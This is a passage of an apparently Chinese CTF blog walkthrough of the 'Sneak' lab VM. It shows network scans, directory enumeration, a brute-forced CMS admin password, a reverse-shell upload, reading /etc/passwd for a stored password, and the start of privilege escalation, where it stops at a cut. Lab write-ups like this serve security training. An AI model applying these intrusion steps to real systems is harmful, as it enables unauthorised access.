@@ -1,0 +1,795 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Miao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机说明QQ群：660930334 一、主机探测123456789101112131415┌──(root㉿kali)-[&#x2F;miao&#x2F;maze-sec&#x2F;sneak]└─# nmap -sn 192.168.2.0&#x2F;24              Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-14 19:04 CSTNmap scan r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sneak">
+<meta property="og:url" content="http://miao-sec.github.io/Maze-sec/Sneak/index.html">
+<meta property="og:site_name" content="Miao&#39;s Blog">
+<meta property="og:description" content="靶机说明QQ群：660930334 一、主机探测123456789101112131415┌──(root㉿kali)-[&#x2F;miao&#x2F;maze-sec&#x2F;sneak]└─# nmap -sn 192.168.2.0&#x2F;24              Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-14 19:04 CSTNmap scan r">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/21.jpg">
+<meta property="article:published_time" content="2025-07-15T07:17:33.000Z">
+<meta property="article:modified_time" content="2025-07-15T07:18:44.918Z">
+<meta property="article:author" content="Miao">
+<meta property="article:tag" content="文件上传">
+<meta property="article:tag" content="ssh私钥格式">
+<meta property="article:tag" content="提权-more">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/21.jpg">
+  
+  
+  
+  <title>Sneak - Miao&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassBg.css">
+<link rel="stylesheet" href="/css/macBorder.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"miao-sec.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"W5UPQ7BHtxFTBIoh5xr1UWMt-gzGzoHsz","app_key":"WEHCtPWZ5dJRfC1hhVipHKwQ","server_url":"https://w5upq7bh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav
+  id="navbar"
+  class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"
+>
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"
+        >Miaosec</strong
+      >
+    </a>
+
+    <button
+      id="navbar-toggler-btn"
+      class="navbar-toggler"
+      type="button"
+      data-toggle="collapse"
+      data-target="#navbarSupportedContent"
+      aria-controls="navbarSupportedContent"
+      aria-expanded="false"
+      aria-label="Toggle navigation"
+    >
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+            
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/"
+            target="_self"
+          >
+            <i class="iconfont icon-home-fill"></i>
+            <span>首页</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/archives/"
+            target="_self"
+          >
+            <i class="iconfont icon-archive-fill"></i>
+            <span>归档</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/categories/"
+            target="_self"
+          >
+            <i class="iconfont icon-category-fill"></i>
+            <span>分类</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/tags/"
+            target="_self"
+          >
+            <i class="iconfont icon-tags-fill"></i>
+            <span>标签</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/links/"
+            target="_self"
+          >
+            <i class="iconfont icon-link-fill"></i>
+            <span>友链</span>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="search-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            data-toggle="modal"
+            data-target="#modalSearch"
+            aria-label="Search"
+          >
+            <i class="iconfont icon-search"></i>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="color-toggle-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            aria-label="Color Toggle"
+          >
+            <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+          </a>
+        </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Sneak"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-15 15:17" pubdate>
+          2025年7月15日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Sneak</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p>
+<h1 id="一、主机探测"><a href="#一、主机探测" class="headerlink" title="一、主机探测"></a>一、主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sneak]<br>└─# nmap -sn 192.168.2.0/24              <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-14 19:04 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00052s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.0011s latency).<br>MAC Address: 08:00:27:4E:1A:DF (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.57<br>Host is up (0.00085s latency).<br>MAC Address: 08:00:27:42:27:37 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.01 seconds<br></code></pre></td></tr></table></figure>
+<p>靶机IP：<code>192.168.2.57</code></p>
+<h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sneak]<br>└─# nmap --min-rate 10000 -p- 192.168.2.57                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-14 19:05 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.57<br>Host is up (0.0013s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:42:27:37 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 44.82 seconds<br></code></pre></td></tr></table></figure>
+<p>开放端口：<code>22,80</code></p>
+<h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sneak]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.57<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-14 19:06 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.57<br>Host is up (0.00092s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">MAC Address: 08:00:27:42:27:37 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 9.10 seconds</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sneak]<br>└─# nmap -sU --top-ports 100 192.168.2.57 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-14 21:30 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.57<br>Host is up (0.0011s latency).<br>Not shown: 99 closed udp ports (port-unreach)<br>PORT   STATE         SERVICE<br>68/udp open|filtered dhcpc<br>MAC Address: 08:00:27:42:27:37 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 104.56 seconds<br></code></pre></td></tr></table></figure>
+<p>没有开放的端口</p>
+<h1 id="三、WEB渗透"><a href="#三、WEB渗透" class="headerlink" title="三、WEB渗透"></a>三、WEB渗透</h1><p>访问80端口，只有一个页面，没啥东西<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507142134257.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<h2 id="1、目录扫描"><a href="#1、目录扫描" class="headerlink" title="1、目录扫描"></a>1、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sneak]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.57/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.57/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              bak,php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 277]<br>/index.html           (Status: 200) [Size: 6]<br>/.html                (Status: 403) [Size: 277]<br>/cms                  (Status: 301) [Size: 310] [--&gt; http://192.168.2.57/cms/]<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
+
+<p>找到一个<code>cms</code>，尝试访问，报500错误<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507142135882.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<p>尝试加上<code>cms</code>后再进行目录扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sneak]<br>└─# dirsearch -u <span class="hljs-string">&quot;http://192.168.2.57/cms&quot;</span><br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html<br>  from pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.4.3<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /miao/maze-sec/sneak/reports/http_192.168.2.57/_cms_25-07-14_21-33-40.txt<br><br>Target: http://192.168.2.57/<br><br>[21:33:40] Starting: cms/<br>[21:33:42] 200 -  413B  - /cms/.gitignore<br>[21:33:42] 403 -  277B  - /cms/.ht_wsr.txt<br>[21:33:42] 403 -  277B  - /cms/.htaccess.bak1<br>[21:33:42] 403 -  277B  - /cms/.htaccess.sample<br>[21:33:42] 403 -  277B  - /cms/.htaccess.orig<br>[21:33:42] 403 -  277B  - /cms/.htaccess.save<br>[21:33:42] 403 -  277B  - /cms/.htaccess_extra<br>[21:33:42] 403 -  277B  - /cms/.htaccess_orig<br>[21:33:42] 403 -  277B  - /cms/.htaccess_sc<br>[21:33:42] 403 -  277B  - /cms/.htaccessBAK<br>[21:33:42] 403 -  277B  - /cms/.htaccessOLD<br>[21:33:42] 403 -  277B  - /cms/.htaccessOLD2<br>[21:33:42] 403 -  277B  - /cms/.htm<br>[21:33:42] 403 -  277B  - /cms/.html<br>[21:33:42] 403 -  277B  - /cms/.htpasswd_test<br>[21:33:42] 403 -  277B  - /cms/.htpasswds<br>[21:33:42] 403 -  277B  - /cms/.httr-oauth<br>[21:33:44] 403 -  277B  - /cms/.php<br>[21:34:05] 200 -    0B  - /cms/config.php<br>[21:34:06] 301 -  318B  - /cms/content  -&gt;  http://192.168.2.57/cms/content/<br>[21:34:06] 200 -    0B  - /cms/content/<br>[21:34:07] 301 -  315B  - /cms/core  -&gt;  http://192.168.2.57/cms/core/<br>[21:34:17] 301 -  318B  - /cms/install  -&gt;  http://192.168.2.57/cms/install/<br>[21:34:17] 200 -  543B  - /cms/install/<br>[21:34:17] 200 -  543B  - /cms/install/index.php?upgrade/<br>[21:34:19] 301 -  314B  - /cms/lib  -&gt;  http://192.168.2.57/cms/lib/<br>[21:34:19] 200 -    0B  - /cms/lib/<br>[21:34:20] 200 -    2KB - /cms/license.txt<br>[21:34:25] 301 -  318B  - /cms/modules  -&gt;  http://192.168.2.57/cms/modules/<br>[21:34:25] 200 -    0B  - /cms/modules/<br>[21:34:36] 200 -    1KB - /cms/README.md<br>[21:34:37] 200 -   90B  - /cms/robots.txt<br>[21:34:44] 301 -  317B  - /cms/styles  -&gt;  http://192.168.2.57/cms/styles/<br><br>Task Completed<br></code></pre></td></tr></table></figure>
+
+<p>在<code>/cms/acp</code>找到一个登录框<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507151422003.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<h2 id="2、密码爆破"><a href="#2、密码爆破" class="headerlink" title="2、密码爆破"></a>2、密码爆破</h2><p>尝试对登录密码进行爆破，找到账号和密码<code>admin:88888888</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507151425297.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<h2 id="3、文件上传"><a href="#3、文件上传" class="headerlink" title="3、文件上传"></a>3、文件上传</h2><p>进入后修改允许上传的文件类型<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507151432658.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<p>上传反弹shell脚本，上传后的文件路径<code>http://192.168.2.57/cms/content/files/rev.php</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507151433252.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<h2 id="4、获取www-data权限"><a href="#4、获取www-data权限" class="headerlink" title="4、获取www-data权限"></a>4、获取www-data权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Sneak:/var/www/html/cms/content/files$ <span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure>
+
+<h1 id="四、获取USER权限"><a href="#四、获取USER权限" class="headerlink" title="四、获取USER权限"></a>四、获取USER权限</h1><p>查看<code>/etc/passwd</code>，发现user用户的密码为<code>user@123</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Sneak:/home/user$ <span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin<br>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin<br>user:x:1001:1001:user@123:/home/user:/bin/bash<br>sysadm:x:1002:1003:Where is my license?:/home/sysadm:/bin/bash<br></code></pre></td></tr></table></figure>
+
+<p>获取user权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Sneak:/home/user$ su user<br>Password: <br>user@Sneak:~$ <span class="hljs-built_in">id</span><br>uid=1001(user) gid=1001(user) <span class="hljs-built_in">groups</span>=1001(user)<br></code></pre></td></tr></table></figure>
+
+<p><strong>USER FLAG</strong></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">user</span>@Sneak:~$ cat <span class="hljs-keyword">user</span>.txt <br>flag&#123;<span class="hljs-keyword">user</span>-<span class="hljs-number">9</span>fcae37cb857fb5fc6f8d74c82a5d0ga&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><h2 id="1、获取sysadm权限"><a href="#1、获取sysadm权限" class="headerlink" title="1、获取sysadm权限"></a>1、获取sysadm权限</h2><p>在<code>/etc/passwd</code>里面提示<code>sysadm:x:1002:1003:Where is my license?:/home/sysadm:/bin/bash</code><br>同时在<code>/cms/license.txt</code>找到私钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code 